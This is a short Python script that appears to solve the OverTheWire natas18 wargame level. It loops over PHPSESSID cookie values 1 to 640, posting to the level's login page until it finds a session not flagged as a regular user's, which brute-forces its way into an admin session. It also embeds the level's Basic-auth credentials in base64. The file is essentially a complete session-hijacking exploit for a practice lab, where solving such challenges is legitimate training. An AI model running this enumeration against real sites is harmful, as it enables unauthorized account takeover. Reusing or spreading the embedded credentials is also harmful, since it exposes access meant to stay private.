import time
import requests

start = time.time()

HEADERS = {"Authorization": "Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA=="}
DATA = {"username": "admin", "password": "bleh"}
session = requests.Session()
session.headers.update(HEADERS)
for i in range(1, 641):
    cookies = {"PHPSESSID": str(i)}
    response_text = session.post("http://natas18.natas.labs.overthewire.org/index.php", data=DATA, cookies=cookies).content.decode("utf-8")
    if "You are logged in as a regular user." in response_text[790:]:
        print("{} Failed".format(i))
        continue
    print("{} Succeeded.".format(i))
    break

end = time.time()
print("Time taken: {}".format(end-start))
